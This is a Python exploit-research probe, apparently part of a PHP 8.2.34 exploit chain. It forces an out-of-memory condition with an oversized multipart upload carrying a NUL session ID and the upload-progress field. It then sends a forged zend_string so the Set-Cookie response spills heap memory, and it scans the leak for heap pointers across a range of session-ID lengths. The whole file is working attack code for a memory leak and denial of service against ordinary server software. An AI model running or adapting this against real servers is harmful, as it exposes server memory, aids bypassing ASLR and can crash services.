#!/usr/bin/env python3
"""Probe: which SID on the LEAK-READ makes 8.2.34 emit a heap-spill Set-Cookie?

OOM vector = exploit.py stage-1 post-1 shape (1001 one-byte fields + NUL sid +
progress + file part + 12MB big field) — confirmed to OOM on 8.2.34.

dinosn's sub-8.3 insight: the leak channel opens only with the RIGHT sid (NUL /
32-char). We OOM once, then try the leak-read (forged 79B zend_string, len=0x1000
-> oversized Set-Cookie) with several SIDs and report which one spills heap.
"""
import os
import struct, sys, time, collections
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "test", "poc8335"))
import exploit as E

HOST, PORT = "127.0.0.1", 18111

def heap_votes(raw: bytes):
    c = collections.Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    return c.most_common(3)

def oom(t):
    parts = [{"name": "p%04d" % i, "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (256 * 1024 * 1024)},
    ]
    t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17,
           read_cap=1 << 20, timeout=120)

def leak_read(t, sid: bytes, n=841):
    parts = [
        {"name": "PHPSESSID", "data": sid},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)   # forged zend_string len
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
    raw = E.parse_cookie(resp)
    return raw, heap_votes(raw)

def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--port83", type=int, default=18112,
                    help="8.3.35 port for A/B comparison")
    ap.add_argument("--len83", action="store_true")
    a = ap.parse_args()
    port = a.port
    t = E.Target(f"http://{HOST}:{port}/", timeout=30, verbose=False)
    # Wide range of SID lengths to find any that opens the spill channel.
    lens = [1, 5, 19, 22, 26, 30, 31, 32, 33, 34, 40, 48, 64, 128, 256]
    for L in lens:
        sid = (b"a" * L)
        oom(t)
        time.sleep(0.15)
        raw, votes = leak_read(t, sid)
        spill = len(raw) > 64
        tag = "SPILL" if spill else ("ok" if raw else "no-cookie")
        heap = any(v >= 8 for _, v in votes)
        print(f"[L={L:3d}] cookie_len={len(raw):5d} heap_ptr={heap} {tag}",
              flush=True)

if __name__ == "__main__":
    main()
